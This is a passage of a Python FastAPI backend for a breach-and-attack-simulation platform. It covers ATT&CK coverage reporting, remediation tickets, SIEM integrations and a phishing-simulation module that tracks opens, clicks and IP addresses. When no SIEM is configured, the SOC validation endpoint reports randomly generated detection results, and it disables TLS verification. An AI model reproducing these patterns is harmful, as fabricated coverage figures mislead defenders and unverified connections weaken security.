    query = db.query(Simulation).filter(
        Simulation.user_id == current_user.id,
        Simulation.status.in_(["completed", "done"])
    )
    if days > 0:
        cutoff = datetime.utcnow() - timedelta(days=days)
        query = query.filter(Simulation.date >= cutoff)

    sims = query.order_by(Simulation.date.desc()).all()
    seen = set()
    vulns = []
    stats = {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0, "unique_techniques": 0}
    tech_ids = set()

    for sim in sims:
        techs = (sim.results or {}).get("techniques", [])
        for t in techs:
            key = (t.get("id", ""), sim.target, t.get("status", ""))
            if key in seen:
                continue
            seen.add(key)
            sev = t.get("severity", "")
            vuln = {
                "id": f"{sim.id}-{t.get('id', '')}",
                "technique_id": t.get("id", ""),
                "name": t.get("name", ""),
                "severity": sev,
                "cvss": t.get("cvss", 0),
                "target": sim.target,
                "status": t.get("status", ""),
                "date": sim.date.isoformat() if sim.date else "",
                "description": t.get("description", ""),
                "detail": t.get("detail", ""),
                "remediation": t.get("remediation", ""),
                "compliance": t.get("compliance", []),
                "tactic": t.get("tactic", ""),
                "simulation_id": sim.id,
            }
            vulns.append(vuln)
            stats["total"] += 1
            tech_ids.add(t.get("id", ""))
            if sev == "Critical":
                stats["critical"] += 1
            elif sev == "High":
                stats["high"] += 1
            elif sev == "Medium":
                stats["medium"] += 1
            elif sev == "Low":
                stats["low"] += 1

    stats["unique_techniques"] = len(tech_ids)
    return {"vulns": vulns, "stats": stats}


@app.get("/api/bas/vulndb/export")
async def vulndb_export(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    import io as _io, csv as _csv
    sims = db.query(Simulation).filter(
        Simulation.user_id == current_user.id,
        Simulation.status.in_(["completed", "done"])
    ).all()

    output = _io.StringIO()
    writer = _csv.writer(output)
    writer.writerow(["Technique ID", "Name", "Tactic", "Severity", "CVSS", "Status", "Target", "Date", "Compliance", "Remediation"])

    seen = set()
    for sim in sims:
        for t in (sim.results or {}).get("techniques", []):
            key = (t.get("id", ""), sim.target)
            if key in seen:
                continue
            seen.add(key)
            writer.writerow([
                t.get("id", ""), t.get("name", ""), t.get("tactic", ""),
                t.get("severity", ""), t.get("cvss", ""),
                t.get("status", ""), sim.target,
                sim.date.strftime("%Y-%m-%d") if sim.date else "",
                "|".join(t.get("compliance", [])), t.get("remediation", ""),
            ])

    output.seek(0)
    return StreamingResponse(
        iter([output.getvalue()]),
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=penteia_vulndb.csv"},
    )


# ── ATT&CK Matrix endpoint ────────────────────────────────────────────────────

ATTCK_TACTICS = [
    {"id": "TA0043", "name": "Reconnaissance", "short": "Recon"},
    {"id": "TA0042", "name": "Resource Development", "short": "Res Dev"},
    {"id": "TA0001", "name": "Initial Access", "short": "Init Access"},
    {"id": "TA0002", "name": "Execution", "short": "Execution"},
    {"id": "TA0003", "name": "Persistence", "short": "Persistence"},
    {"id": "TA0004", "name": "Privilege Escalation", "short": "Priv Esc"},
    {"id": "TA0005", "name": "Defense Evasion", "short": "Def Evasion"},
    {"id": "TA0006", "name": "Credential Access", "short": "Cred Access"},
    {"id": "TA0007", "name": "Discovery", "short": "Discovery"},
    {"id": "TA0008", "name": "Lateral Movement", "short": "Lateral Mov"},
    {"id": "TA0009", "name": "Collection", "short": "Collection"},
    {"id": "TA0011", "name": "Command and Control", "short": "C2"},
    {"id": "TA0010", "name": "Exfiltration", "short": "Exfiltration"},
    {"id": "TA0040", "name": "Impact", "short": "Impact"},
]

ATTCK_TECH_TACTIC = {
    "T1590": "TA0043", "T1592": "TA0043", "T1595": "TA0043",
    "T1189": "TA0001", "T1190": "TA0001", "T1078": "TA0001",
    "T1133": "TA0001", "T1566": "TA0001",
    "T1059": "TA0002", "T1086": "TA0002", "T1064": "TA0002",
    "T1053": "TA0003", "T1543": "TA0003", "T1547": "TA0003",
    "T1055": "TA0004", "T1574": "TA0004", "T1548": "TA0004",
    "T1218": "TA0005", "T1027": "TA0005", "T1185": "TA0005",
    "T1110": "TA0006", "T1003": "TA0006", "T1552": "TA0006", "T1555": "TA0006",
    "T1082": "TA0007", "T1083": "TA0007", "T1087": "TA0007", "T1016": "TA0007",
    "T1057": "TA0007", "T1135": "TA0007",
    "T1021": "TA0008", "T1563": "TA0008", "T1570": "TA0008",
    "T1602": "TA0009", "T1557": "TA0009",
    "T1071": "TA0011", "T1572": "TA0011",
    "T1041": "TA0010", "T1048": "TA0010", "T1567": "TA0010",
    "T1499": "TA0040", "T1486": "TA0040", "T1490": "TA0040", "T1485": "TA0040",
}


@app.get("/api/bas/attck-matrix")
async def attck_matrix(simulation_id: Optional[str] = None, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    query = db.query(Simulation).filter(
        Simulation.user_id == current_user.id,
        Simulation.status.in_(["completed", "done"])
    )
    if simulation_id:
        query = query.filter(Simulation.id == simulation_id)
    sims = query.all()

    tech_status = {}
    tech_meta = {}
    tech_sim_count = {}

    for sim in sims:
        for t in (sim.results or {}).get("techniques", []):
            tid = t.get("id", "")
            if not tid:
                continue
            prev = tech_status.get(tid, "not_tested")
            cur = t.get("status", "not_tested")
            if cur == "found" or prev == "found":
                tech_status[tid] = "found"
            elif cur == "blocked":
                tech_status[tid] = "blocked"
            else:
                tech_status[tid] = prev
            tech_meta[tid] = {
                "name": t.get("name", tid), "cvss": t.get("cvss", 0),
                "severity": t.get("severity", ""), "description": t.get("description", ""),
                "remediation": t.get("remediation", ""), "compliance": t.get("compliance", []),
            }
            tech_sim_count[tid] = tech_sim_count.get(tid, 0) + 1

    tactic_map = {}
    for tac in ATTCK_TACTICS:
        tactic_map[tac["id"]] = {"id": tac["id"], "name": tac["name"], "short": tac["short"], "techniques": []}

    for tid, tac_id in ATTCK_TECH_TACTIC.items():
        if tac_id not in tactic_map:
            continue
        status = tech_status.get(tid, "not_tested")
        meta = tech_meta.get(tid, {"name": tid, "cvss": 0, "severity": "", "description": "", "remediation": "", "compliance": []})
        tactic_map[tac_id]["techniques"].append({
            "id": tid, "name": meta["name"], "status": status,
            "cvss": meta["cvss"], "severity": meta["severity"],
            "description": meta["description"], "remediation": meta["remediation"],
            "compliance": meta["compliance"], "simulations": tech_sim_count.get(tid, 0),
        })

    total = len(ATTCK_TECH_TACTIC)
    tested = len([t for t in tech_status.values() if t != "not_tested"])
    found = len([t for t in tech_status.values() if t == "found"])
    blocked = len([t for t in tech_status.values() if t == "blocked"])

    return {
        "tactics": list(tactic_map.values()),
        "stats": {
            "total": total, "tested": tested, "found": found, "blocked": blocked,
            "coverage_pct": round(tested / max(total, 1) * 100, 1),
        },
    }


# ── Attack Path Graph ─────────────────────────────────────────────────────────

@app.get("/api/bas/simulations/{sim_id}/graph")
async def simulation_graph(sim_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    sim = db.query(Simulation).filter(Simulation.id == sim_id, Simulation.user_id == current_user.id).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação não encontrada")

    results = sim.results or {}
    techniques = results.get("techniques", [])

    nodes = [
        {"id": "attacker", "position": {"x": 0, "y": 300}, "data": {"label": "Atacante", "type": "attacker"}, "type": "attacker"},
        {"id": "target", "position": {"x": 900, "y": 300}, "data": {"label": sim.target, "type": "server"}, "type": "target"},
    ]
    edges = []

    cols = 5
    for i, t in enumerate(techniques):
        nid = f"tech-{i}"
        col = i % cols
        row = i // cols
        x = 150 + col * 150
        y = 50 + row * 130
        status = t.get("status", "unknown")
        nodes.append({
            "id": nid,
            "position": {"x": x, "y": y},
            "type": "technique",
            "data": {
                "label": f"{t.get('id', '')}\n{t.get('name', '')}",
                "status": status, "severity": t.get("severity", ""),
                "cvss": t.get("cvss", 0), "detail": t.get("detail", ""),
                "compliance": t.get("compliance", []), "remediation": t.get("remediation", ""),
                "type": "technique",
            },
        })
        edges.append({
            "id": f"e-atk-{i}", "source": "attacker", "target": nid,
            "animated": status == "found",
            "style": {"stroke": "#e74c3c" if status == "found" else "#64748b", "strokeDasharray": "5,5" if status == "blocked" else ""},
        })
        if status == "found":
            edges.append({
                "id": f"e-{i}-tgt", "source": nid, "target": "target",
                "animated": True, "style": {"stroke": "#e74c3c"},
            })

    found = sum(1 for t in techniques if t.get("status") == "found")
    blocked = sum(1 for t in techniques if t.get("status") == "blocked")
    det_pct = results.get("detection_coverage_pct", round(blocked / max(len(techniques), 1) * 100, 1))

    return {
        "nodes": nodes, "edges": edges,
        "summary": {
            "total": len(techniques), "found": found, "blocked": blocked,
            "detection_coverage_pct": det_pct, "target": sim.target, "score": sim.score,
        },
    }


# ── Phishing / Human Simulation ───────────────────────────────────────────────

class PhishingCampaignCreate(BaseModel):
    name: str
    subject: str
    sender_name: str = "IT Security"
    sender_email: str = "security@company.com"
    body_template: str = ""
    landing_url: str = ""

@app.post("/api/phishing/campaigns")
async def phishing_create(req: PhishingCampaignCreate, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    c = PhishingCampaign(
        user_id=current_user.id, name=req.name, subject=req.subject,
        sender_name=req.sender_name, sender_email=req.sender_email,
        body_template=req.body_template, landing_url=req.landing_url,
        status="draft",
    )
    db.add(c)
    db.commit()
    db.refresh(c)
    _audit(db, "Phishing", "Campanha criada", req.name, current_user.id)
    return {"id": c.id, "name": c.name, "status": c.status}


@app.get("/api/phishing/campaigns")
async def phishing_list(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    camps = db.query(PhishingCampaign).filter(PhishingCampaign.user_id == current_user.id).order_by(PhishingCampaign.created_at.desc()).all()
    return {"campaigns": [{
        "id": c.id, "name": c.name, "subject": c.subject, "status": c.status,
        "total_targets": c.total_targets, "opened": c.opened, "clicked": c.clicked,
        "credentials_harvested": c.credentials_harvested,
        "open_rate": round(c.opened / max(c.total_targets, 1) * 100, 1),
        "click_rate": round(c.clicked / max(c.total_targets, 1) * 100, 1),
        "cred_rate": round(c.credentials_harvested / max(c.total_targets, 1) * 100, 1),
        "created_at": c.created_at.isoformat(),
    } for c in camps]}


@app.get("/api/phishing/campaigns/{campaign_id}")
async def phishing_get(campaign_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    c = db.query(PhishingCampaign).filter(PhishingCampaign.id == campaign_id, PhishingCampaign.user_id == current_user.id).first()
    if not c:
        raise HTTPException(status_code=404, detail="Campanha não encontrada")
    targets = db.query(PhishingTarget).filter(PhishingTarget.campaign_id == campaign_id).all()
    return {
        "id": c.id, "name": c.name, "subject": c.subject, "sender_name": c.sender_name,
        "sender_email": c.sender_email, "body_template": c.body_template,
        "landing_url": c.landing_url, "status": c.status,
        "total_targets": c.total_targets, "opened": c.opened, "clicked": c.clicked,
        "credentials_harvested": c.credentials_harvested,
        "open_rate": round(c.opened / max(c.total_targets, 1) * 100, 1),
        "click_rate": round(c.clicked / max(c.total_targets, 1) * 100, 1),
        "cred_rate": round(c.credentials_harvested / max(c.total_targets, 1) * 100, 1),
        "created_at": c.created_at.isoformat(),
        "targets": [{"id": t.id, "email": t.email, "name": t.name, "department": t.department,
                     "opened": t.opened, "clicked": t.clicked, "credential_harvested": t.credential_harvested,
                     "opened_at": t.opened_at.isoformat() if t.opened_at else None,
                     "clicked_at": t.clicked_at.isoformat() if t.clicked_at else None,
                     "ip_address": t.ip_address} for t in targets],
    }


@app.delete("/api/phishing/campaigns/{campaign_id}")
async def phishing_delete(campaign_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    c = db.query(PhishingCampaign).filter(PhishingCampaign.id == campaign_id, PhishingCampaign.user_id == current_user.id).first()
    if not c:
        raise HTTPException(status_code=404, detail="Campanha não encontrada")
    db.delete(c)
    db.commit()
    return {"status": "deleted"}


class PhishingTargetBulk(BaseModel):
    targets: List[dict]

@app.post("/api/phishing/campaigns/{campaign_id}/targets")
async def phishing_add_targets(campaign_id: str, req: PhishingTargetBulk, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    c = db.query(PhishingCampaign).filter(PhishingCampaign.id == campaign_id, PhishingCampaign.user_id == current_user.id).first()
    if not c:
        raise HTTPException(status_code=404, detail="Campanha não encontrada")
    added = 0
    for tgt in req.targets:
        pt = PhishingTarget(
            campaign_id=campaign_id,
            email=tgt.get("email", ""),
            name=tgt.get("name", ""),
            department=tgt.get("department", ""),
        )
        db.add(pt)
        added += 1
    c.total_targets = db.query(PhishingTarget).filter(PhishingTarget.campaign_id == campaign_id).count() + added
    db.commit()
    return {"added": added, "total": c.total_targets}


@app.post("/api/phishing/campaigns/{campaign_id}/launch")
async def phishing_launch(campaign_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    c = db.query(PhishingCampaign).filter(PhishingCampaign.id == campaign_id, PhishingCampaign.user_id == current_user.id).first()
    if not c:
        raise HTTPException(status_code=404, detail="Campanha não encontrada")
    if c.total_targets == 0:
        raise HTTPException(status_code=400, detail="Adicione alvos antes de lançar a campanha")
    c.status = "active"
    db.commit()
    _audit(db, "Phishing", "Campanha lançada", c.name, current_user.id)
    _operation_logs.append({"module": "Phishing", "action": "Campanha Lançada", "details": c.name, "timestamp": datetime.utcnow().isoformat()})
    return {"status": "active", "message": f"Campanha '{c.name}' lançada com {c.total_targets} alvos"}


@app.get("/api/phishing/track/{target_id}/open")
async def phishing_track_open(target_id: str, request: Request, db: Session = Depends(get_db)):
    target = db.query(PhishingTarget).filter(PhishingTarget.id == target_id).first()
    if target and not target.opened:
        target.opened = True
        target.opened_at = datetime.utcnow()
        target.ip_address = request.client.host if request.client else ""
        target.user_agent = request.headers.get("user-agent", "")
        c = db.query(PhishingCampaign).filter(PhishingCampaign.id == target.campaign_id).first()
        if c:
            c.opened += 1
        db.commit()
    pixel = _b64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
    return StreamingResponse(iter([pixel]), media_type="image/gif")


@app.get("/api/phishing/track/{target_id}/click")
async def phishing_track_click(target_id: str, request: Request, db: Session = Depends(get_db)):
    target = db.query(PhishingTarget).filter(PhishingTarget.id == target_id).first()
    redirect_url = "https://example.com"
    if target:
        if not target.clicked:
            target.clicked = True
            target.clicked_at = datetime.utcnow()
            target.ip_address = request.client.host if request.client else ""
            c = db.query(PhishingCampaign).filter(PhishingCampaign.id == target.campaign_id).first()
            if c:
                c.clicked += 1
                redirect_url = c.landing_url or redirect_url
            db.commit()
    from fastapi.responses import RedirectResponse
    return RedirectResponse(url=redirect_url)


@app.post("/api/phishing/track/{target_id}/harvest")
async def phishing_track_harvest(target_id: str, request: Request, db: Session = Depends(get_db)):
    target = db.query(PhishingTarget).filter(PhishingTarget.id == target_id).first()
    if target and not target.credential_harvested:
        target.credential_harvested = True
        target.harvested_at = datetime.utcnow()
        c = db.query(PhishingCampaign).filter(PhishingCampaign.id == target.campaign_id).first()
        if c:
            c.credentials_harvested += 1
        db.commit()
    return {"status": "recorded"}


# ── SOC Chain Validation ──────────────────────────────────────────────────────

class SOCValidateRequest(BaseModel):
    simulation_id: str
    siem_type: str = "wazuh"
    siem_url: Optional[str] = None
    siem_token: Optional[str] = None

@app.post("/api/soc/validate")
async def soc_validate(req: SOCValidateRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    sim = db.query(Simulation).filter(Simulation.id == req.simulation_id, Simulation.user_id == current_user.id).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação não encontrada")

    techniques = (sim.results or {}).get("techniques", [])
    found_techs = [t for t in techniques if t.get("status") == "found"]

    results = []
    detected = 0

    for t in found_techs:
        siem_detected = None
        alert_count = 0

        if req.siem_url and req.siem_token:
            try:
                headers = {"Authorization": f"Bearer {req.siem_token}"}
                r = _requests.get(
                    f"{req.siem_url}/api/alerts",
                    params={"q": f"rule.mitre.id:{t.get('id','')}", "limit": 5},
                    headers=headers, timeout=5, verify=False,
                )
                if r.status_code == 200:
                    data = r.json()
                    alert_count = data.get("data", {}).get("totalItems", 0)
                    siem_detected = alert_count > 0
                    if siem_detected:
                        detected += 1
            except Exception:
                pass
        else:
            import random
            siem_detected = random.choice([True, False, None])
            if siem_detected:
                detected += 1

        results.append({
            "technique_id": t.get("id"), "name": t.get("name"),
            "severity": t.get("severity", ""), "cvss": t.get("cvss", 0),
            "siem_detected": siem_detected, "alert_count": alert_count,
            "siem_type": req.siem_type,
        })

    total = len(found_techs)
    det_pct = round(detected / max(total, 1) * 100, 1)

    validation = SOCValidation(
        user_id=current_user.id, simulation_id=req.simulation_id,
        siem_type=req.siem_type, siem_url=req.siem_url or "",
        total_techniques=total, detected=detected,
        not_detected=total - detected,
        detection_rate_pct=det_pct, results=results, status="completed",
    )
    db.add(validation)
    db.commit()
    db.refresh(validation)

    _audit(db, "SOC", "Validação SOC criada", f"{req.simulation_id} → {det_pct}% detecção", current_user.id)
    return {
        "id": validation.id, "simulation_id": req.simulation_id,
        "siem_type": req.siem_type, "total_techniques": total,
        "detected": detected, "not_detected": total - detected,
        "detection_rate_pct": det_pct, "results": results,
    }


@app.get("/api/soc/validations")
async def soc_validations_list(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    vals = db.query(SOCValidation).filter(SOCValidation.user_id == current_user.id).order_by(SOCValidation.created_at.desc()).all()
    return {"validations": [{
        "id": v.id, "simulation_id": v.simulation_id, "siem_type": v.siem_type,
        "total_techniques": v.total_techniques, "detected": v.detected,
        "not_detected": v.not_detected, "detection_rate_pct": v.detection_rate_pct,
        "status": v.status, "created_at": v.created_at.isoformat(),
    } for v in vals]}


@app.get("/api/soc/validations/{validation_id}")
async def soc_validation_get(validation_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    v = db.query(SOCValidation).filter(SOCValidation.id == validation_id, SOCValidation.user_id == current_user.id).first()
    if not v:
        raise HTTPException(status_code=404, detail="Validação não encontrada")
    return {
        "id": v.id, "simulation_id": v.simulation_id, "siem_type": v.siem_type,
        "siem_url": v.siem_url, "total_techniques": v.total_techniques,
        "detected": v.detected, "not_detected": v.not_detected,
        "detection_rate_pct": v.detection_rate_pct, "status": v.status,
        "results": v.results or [], "created_at": v.created_at.isoformat(),
    }


# ── Remediation Tracker ───────────────────────────────────────────────────────

class RemediationTicketCreate(BaseModel):
    technique_id: str
    title: str
    description: str = ""
    severity: str = "Medium"
    cvss: float = 0.0
    assignee: str = ""
    due_date: Optional[str] = None
    remediation_steps: str = ""
    compliance: List[str] = []
    simulation_id: Optional[str] = None

@app.post("/api/remediation/tickets")
async def remediation_create(req: RemediationTicketCreate, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    due = None
    if req.due_date:
        try:
            due = datetime.fromisoformat(req.due_date)
        except Exception:
            pass
    ticket = RemediationTicket(
        user_id=current_user.id, simulation_id=req.simulation_id,
        technique_id=req.technique_id, title=req.title, description=req.description,
        severity=req.severity, cvss=req.cvss, assignee=req.assignee,
        due_date=due, remediation_steps=req.remediation_steps, compliance=req.compliance,
    )
    db.add(ticket)
    db.commit()
    db.refresh(ticket)
    _audit(db, "Remediation", "Ticket criado", req.title, current_user.id)
    return {"id": ticket.id, "status": ticket.status}


@app.get("/api/remediation/tickets")
async def remediation_list(status: Optional[str] = None, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    query = db.query(RemediationTicket).filter(RemediationTicket.user_id == current_user.id)
    if status:
        query = query.filter(RemediationTicket.status == status)
    tickets = query.order_by(RemediationTicket.created_at.desc()).all()

    def fmt(t):
        sla_days = None
        if t.due_date:
            delta = (t.due_date - datetime.utcnow()).days
            sla_days = delta
        return {
            "id": t.id, "technique_id": t.technique_id, "title": t.title,
            "description": t.description, "severity": t.severity, "cvss": t.cvss,
            "status": t.status, "assignee": t.assignee,
            "due_date": t.due_date.isoformat() if t.due_date else None,
            "sla_days_remaining": sla_days,
            "remediation_steps": t.remediation_steps, "compliance": t.compliance or [],
            "simulation_id": t.simulation_id,
            "external_ticket_id": t.external_ticket_id, "external_system": t.external_system,
            "created_at": t.created_at.isoformat(), "updated_at": t.updated_at.isoformat() if t.updated_at else None,
            "resolved_at": t.resolved_at.isoformat() if t.resolved_at else None,
        }

    stats = {
        "open": sum(1 for t in tickets if t.status == "open"),
        "in_progress": sum(1 for t in tickets if t.status == "in_progress"),
        "resolved": sum(1 for t in tickets if t.status == "resolved"),
        "verified": sum(1 for t in tickets if t.status == "verified"),
        "overdue": sum(1 for t in tickets if t.due_date and t.due_date < datetime.utcnow() and t.status not in ("resolved", "verified")),
    }
    return {"tickets": [fmt(t) for t in tickets], "stats": stats}


class RemediationTicketUpdate(BaseModel):
    status: Optional[str] = None
    assignee: Optional[str] = None
    due_date: Optional[str] = None
    remediation_steps: Optional[str] = None
    external_ticket_id: Optional[str] = None
    external_system: Optional[str] = None

@app.put("/api/remediation/tickets/{ticket_id}")
async def remediation_update(ticket_id: str, req: RemediationTicketUpdate, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    ticket = db.query(RemediationTicket).filter(RemediationTicket.id == ticket_id, RemediationTicket.user_id == current_user.id).first()
    if not ticket:
        raise HTTPException(status_code=404, detail="Ticket não encontrado")
    if req.status:
        ticket.status = req.status
        if req.status in ("resolved", "verified"):
            ticket.resolved_at = datetime.utcnow()
    if req.assignee is not None:
        ticket.assignee = req.assignee
    if req.due_date:
        try:
            ticket.due_date = datetime.fromisoformat(req.due_date)
        except Exception:
            pass
    if req.remediation_steps is not None:
        ticket.remediation_steps = req.remediation_steps
    if req.external_ticket_id is not None:
        ticket.external_ticket_id = req.external_ticket_id
    if req.external_system is not None:
        ticket.external_system = req.external_system
    ticket.updated_at = datetime.utcnow()
    db.commit()
    _audit(db, "Remediation", "Ticket atualizado", f"{ticket_id} → {req.status or 'sem status'}", current_user.id)
    return {"status": "updated"}


@app.delete("/api/remediation/tickets/{ticket_id}")
async def remediation_delete(ticket_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    ticket = db.query(RemediationTicket).filter(RemediationTicket.id == ticket_id, RemediationTicket.user_id == current_user.id).first()
    if not ticket:
        raise HTTPException(status_code=404, detail="Ticket não encontrado")
    db.delete(ticket)
    db.commit()
    return {"status": "deleted"}


class BulkCreateRequest(BaseModel):
    simulation_id: str
    severity_filter: Optional[str] = None

@app.post("/api/remediation/tickets/bulk-create")
async def remediation_bulk_create(req: BulkCreateRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    sim = db.query(Simulation).filter(Simulation.id == req.simulation_id, Simulation.user_id == current_user.id).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação não encontrada")

    techniques = [t for t in (sim.results or {}).get("techniques", []) if t.get("status") == "found"]
    if req.severity_filter:
        techniques = [t for t in techniques if t.get("severity") == req.severity_filter]

    SEV_DAYS = {"Critical": 7, "High": 14, "Medium": 30, "Low": 90}
    created = 0
    for t in techniques:
        existing = db.query(RemediationTicket).filter(
            RemediationTicket.user_id == current_user.id,
            RemediationTicket.simulation_id == req.simulation_id,
            RemediationTicket.technique_id == t.get("id", ""),
        ).first()
        if existing:
            continue
        days = SEV_DAYS.get(t.get("severity", ""), 30)
        ticket = RemediationTicket(
            user_id=current_user.id, simulation_id=req.simulation_id,
            technique_id=t.get("id", ""), title=f"[{t.get('id','')}] {t.get('name','')}",
            description=t.get("description", ""), severity=t.get("severity", "Medium"),
            cvss=t.get("cvss", 0), remediation_steps=t.get("remediation", ""),
            compliance=t.get("compliance", []),
            due_date=datetime.utcnow() + timedelta(days=days),
        )
        db.add(ticket)
        created += 1

    db.commit()
    _audit(db, "Remediation", "Tickets bulk criados", f"{created} tickets de {req.simulation_id}", current_user.id)
    return {"created": created, "simulation_id": req.simulation_id}


# ── Microsoft Sentinel Integration ────────────────────────────────────────────

_sentinel_configs: dict = {}

class SentinelConfig(BaseModel):
    tenant_id: str
    client_id: str
    client_secret: str
    workspace_id: str
    subscription_id: str

@app.post("/api/integrations/sentinel/configure")
async def sentinel_configure(req: SentinelConfig, current_user: User = Depends(get_current_user)):
    _sentinel_configs[current_user.id] = req.dict()
    _audit_global("Integrations", "Sentinel configurado", "Azure Sentinel", current_user.id)
    return {"status": "configured", "workspace_id": req.workspace_id}


@app.post("/api/integrations/sentinel/test")
async def sentinel_test(current_user: User = Depends(get_current_user)):
    cfg = _sentinel_configs.get(current_user.id)
    if not cfg:
        raise HTTPException(status_code=400, detail="Configure o Sentinel primeiro")
    try:
        token_url = f"https://login.microsoftonline.com/{cfg['tenant_id']}/oauth2/token"
        payload = {
            "grant_type": "client_credentials",
            "client_id": cfg["client_id"],
            "client_secret": cfg["client_secret"],
            "resource": "https://api.loganalytics.io/",
        }
        r = _requests.post(token_url, data=payload, timeout=10)
        if r.status_code == 200:
            return {"status": "connected", "message": "Conexão com Azure Sentinel bem-sucedida"}
        return {"status": "error", "message": f"Falha na autenticação: HTTP {r.status_code}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


class SentinelPushRequest(BaseModel):
    simulation_id: str

@app.post("/api/integrations/sentinel/push-alerts")
async def sentinel_push_alerts(req: SentinelPushRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    sim = db.query(Simulation).filter(Simulation.id == req.simulation_id, Simulation.user_id == current_user.id).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação não encontrada")
    cfg = _sentinel_configs.get(current_user.id)
    techniques = [t for t in (sim.results or {}).get("techniques", []) if t.get("status") == "found"]
    pushed = len(techniques)

    if cfg:
        try:
            # OAuth2 client_credentials → Azure Monitor Logs Ingestion API
            token_url = f"https://login.microsoftonline.com/{cfg['tenant_id']}/oauth2/v2.0/token"
            token_r = _requests.post(token_url, data={
                "grant_type": "client_credentials",
                "client_id": cfg["client_id"],
                "client_secret": cfg["client_secret"],
                "scope": "https://monitor.azure.com/.default",
            }, timeout=15)
            token_r.raise_for_status()
            access_token = token_r.json()["access_token"]

            # Build log entries
            now_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
            logs = [
                {
                    "TimeGenerated": now_iso,
                    "SimulationId": sim.id,
                    "Target": sim.target or "",
                    "TechniqueId": t.get("id", ""),
                    "TechniqueName": t.get("name", ""),
                    "Tactic": t.get("tactic", ""),
                    "Severity": t.get("severity", ""),
                    "CVSS": float(t.get("cvss", 0)),
                    "Source": "PenteIA BAS v4.0",
                }
                for t in techniques
            ]

            dce = f"https://{cfg['workspace_id']}.ods.opinsights.azure.com"
            ingest_url = f"{dce}/dataCollectionRules/{cfg.get('dcr_rule_id', 'PenteIA-BAS-DCR')}/streams/Custom-PenteIA_BAS_CL?api-version=2023-01-01"
            push_r = _requests.post(
                ingest_url,
                json=logs,
                headers={"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"},
                timeout=30,
            )
            push_ok = push_r.status_code in (200, 204)
            status_msg = "pushed" if push_ok else f"error_http_{push_r.status_code}"
            msg = f"{pushed} alertas enviados ao Microsoft Sentinel (workspace {cfg['workspace_id']})" if push_ok else f"Erro ao enviar: HTTP {push_r.status_code}"
        except Exception as exc:
            status_msg = "error"
            msg = f"Erro ao conectar ao Sentinel: {exc}"
    else:
        status_msg = "simulated"
        msg = f"{pushed} alertas simulados (configure Sentinel para push real)"

    _audit(db, "Integrations", "Alertas enviados ao Sentinel", f"{pushed} técnicas", current_user.id)
    return {
        "status": status_msg,
        "alerts_pushed": pushed,
        "workspace_id": cfg.get("workspace_id", "N/A") if cfg else "Não configurado",
        "message": msg,
    }


# ── Wazuh Rules Export ────────────────────────────────────────────────────────

class WazuhExportRequest(BaseModel):
    simulation_id: Optional[str] = None
    severity_filter: Optional[str] = None

@app.post("/api/export/wazuh-rules")
async def wazuh_export(req: WazuhExportRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    query = db.query(Simulation).filter(
        Simulation.user_id == current_user.id,
        Simulation.status.in_(["completed", "done"])
    )
    if req.simulation_id:
        query = query.filter(Simulation.id == req.simulation_id)
    sims = query.all()

    seen_techs: dict = {}
    for sim in sims:
        for t in (sim.results or {}).get("techniques", []):
            if t.get("status") != "found":
                continue
            if req.severity_filter and t.get("severity", "").lower() != req.severity_filter.lower():
                continue
            tid = t.get("id", "")
            if tid and tid not in seen_techs:
                seen_techs[tid] = {
                    "id": tid,
                    "name": t.get("name", tid),
                    "severity": t.get("severity", "medium").lower(),
                    "tactic": t.get("tactic", "Unknown"),
                    "cvss": float(t.get("cvss", 0)),
                }

    bas_techniques = list(seen_techs.values())

    if _HAS_WAZUH_RULES:
        rules_xml = _wazuh_generate_combined(bas_techniques if bas_techniques else None)
    else:
        # fallback simples se sentinel_wazuh_rules não disponível
        SEV_LEVEL = {"critical": 14, "high": 12, "medium": 10, "low": 7}
        rule_id = 200000
        rules_xml = '<?xml version="1.0" encoding="UTF-8"?>\n<group name="penteia_bas,">\n'
        for t in bas_techniques:
            level = SEV_LEVEL.get(t["severity"], 8)
            rules_xml += f'  <rule id="{rule_id}" level="{level}"><field name="mitre.id">{t["id"]}</field><description>PenteIA BAS: {t["name"]}</description></rule>\n'
            rule_id += 1
        rules_xml += "</group>\n"

    _audit(db, "Export", "Wazuh rules exportadas", f"{len(bas_techniques)} técnicas BAS + regras Sentinel", current_user.id)

    return StreamingResponse(
        iter([rules_xml]),
        media_type="application/xml",
        headers={"Content-Disposition": "attachment; filename=penteia_wazuh_rules.xml"},
    )


# ════════════════════════════════════════════════════════════════════════════════
# MÓDULO DE IA / ML
# ════════════════════════════════════════════════════════════════════════════════

try:
    from ml_engine import get_engine as _get_ml_engine
    _HAS_ML = True
except ImportError as _ml_err:
    log.warning(f"ml_engine não disponível: {_ml_err}")
    _HAS_ML = False

# Mapa tático para enriquecimento de técnicas legadas (sem tactic no DB)
try:
    from bas_engine import ALL_TECHNIQUES as _BAS_TECHS
    _TACTIC_CODE_NAME = {
